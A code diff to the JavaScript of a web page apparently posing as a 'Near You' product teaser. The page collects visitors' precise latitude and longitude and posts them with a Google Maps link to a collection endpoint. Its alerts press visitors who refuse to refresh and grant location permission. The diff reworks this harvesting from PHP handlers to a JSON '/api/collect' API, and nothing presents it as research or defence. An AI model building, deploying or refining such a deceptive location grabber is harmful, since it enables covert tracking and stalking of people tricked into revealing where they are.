@@ -16,10 +16,17 @@ function locate()
     var lon = position.coords.longitude;
     $.ajax({
       type: 'POST',
-      url: 'handler.php',
-      data: {"data":`Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
+      url: '/api/collect',
+      contentType: 'application/json',
+      data: JSON.stringify({
+        template: 'nearyou',
+        data: {
+          latitude: lat,
+          longitude: lon,
+          map_url: `https://google.com/maps/place/${lat}+${lon}`
+        }
+      }),
       success: function(){$('#change').html('Coming Soon');},
-      mimeType: 'text'
     });
     alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
   };
@@ -27,29 +34,35 @@ function locate()
 
 function showError(error)
 {
+  var errorData = {};
 	switch(error.code)
   {
 		case error.PERMISSION_DENIED:
-			var denied = 'User denied the request for Geolocation';
+			errorData.denied = 'User denied the request for Geolocation';
       alert('Please Refresh This Page and Allow Location Permission...');
       break;
 		case error.POSITION_UNAVAILABLE:
-			var unavailable = 'Location information is unavailable';
+			errorData.unavailable = 'Location information is unavailable';
 			break;
 		case error.TIMEOUT:
-			var timeout = 'The request to get user location timed out';
+			errorData.timeout = 'The request to get user location timed out';
       alert('Please Set Your Location Mode on High Accuracy...');
 			break;
 		case error.UNKNOWN_ERROR:
-			var unknown = 'An unknown error occurred';
+			errorData.unknown = 'An unknown error occurred';
 			break;
 	}
 
   $.ajax({
     type: 'POST',
-    url: 'error.php',
-    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
+    url: '/api/collect',
+    contentType: 'application/json',
+    data: JSON.stringify({
+      template: 'nearyou',
+      data: {
+        error: errorData
+      }
+    }),
     success: function(){$('#change').html('Failed');},
-    mimeType: 'text'
   });
 }
